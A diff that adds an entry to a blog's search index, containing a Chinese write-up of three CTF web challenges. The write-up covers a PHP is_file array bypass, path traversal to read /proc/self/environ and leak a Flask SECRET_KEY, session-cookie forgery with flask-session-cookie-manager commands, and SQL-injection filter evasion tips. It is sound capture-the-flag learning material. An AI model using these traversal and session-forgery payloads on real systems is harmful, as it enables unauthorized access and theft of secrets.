@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>Henuctf</title>
+    <link href="/2021/03/07/henuctf/"/>
+    <url>/2021/03/07/henuctf/</url>
+    
+    <content type="html"><![CDATA[<h2 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h2><pre><code>```php &lt;?phperror_reporting(0);include &#39;flag.php&#39;;highlight_file(__FILE__);if(!(is_file($_GET[&#39;name&#39;])===false))&#123;    echo $flag;    &#125;else&#123;    die(&quot;发生甚么事了？&quot;);    &#125;?&gt; 发生甚么事了？```    </code></pre><p><code>is_file</code> — 判断给定文件名是否为一个正常的文件<br>如果文件存在且为正常的文件则返回 TRUE，否则返回 FALSE。<br>上面有个<code>flag.php</code>,那直接<code>name=flag.php</code>即可      </p><p>但是，学长说这道题出错了，不应该<code>include &#39;flag.php&#39;;</code><br>预期的解是用数组绕过<code>is_file</code>函数<br><code>name[]=1</code>      </p><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>hint：当前进程下的环境变量为<code>/proc/self/environ</code><br>知识点：flask session伪造<br>任意文件读取，<img src="https://ftp.bmp.ovh/imgs/2021/03/1934b3e1e8d9fb33.png"><br>读取hint中的文件，不过要先进行目录跳跃</p><p><code>download?image=/../../proc/self/environ</code><br>里面有<code>SECRET_KEY=SK7BM6DwM52ByfSmNJfP1QYe4MdXnMUW3ibrL8AtHOSTNAME</code>密钥<br>然后用<code>flask-session-cookie-manager</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/5f53b08a21a8d4fe.png"><br>提交即可<br><code>flask-session-cookie-manager</code>基本用法：<br>编码：  </p><pre><code>$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s &#39;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#39; -t &#39;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#39;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw       </code></pre><p>解码：<br>使用密钥：      </p><pre><code>$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#39;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#39; -s &#39;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#39;&#123;u&#39;username&#39;: &#39;admin&#39;, u&#39;number&#39;: &#39;326410031505&#39;&#125;        </code></pre><p>没有密钥：       </p><pre><code>$ python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py decode -c &#39;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#39;&#123;&quot;number&quot;:&#123;&quot; b&quot;:&quot;MzI2NDEwMDMxNTA1&quot;&#125;,&quot;username&quot;:&#123;&quot; b&quot;:&quot;YWRtaW4=&quot;&#125;&#125;          </code></pre><p><a href="https://github.com/noraj/flask-session-cookie-manager">MORE</a></p><h2 id="love"><a href="#love" class="headerlink" title="love"></a>love</h2><p>这道SQL注入，把ascii和substr禁了，然后就不知道该咋弄了，百度当时也没查到         </p><pre><code>ascii可以用ord替换        substr可以用mid,left应该也可以        </code></pre><p>异或</p><pre><code>1 ^ 1 = 00 ^ 0 = 01 ^ 0 = 10 ^ 1 = 11^1^1=11^0^1=0</code></pre><p>太笨了太笨了</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUU每日打卡</title>
     <link href="/2021/03/06/BUU046/"/>
     <url>/2021/03/06/BUU046/</url>
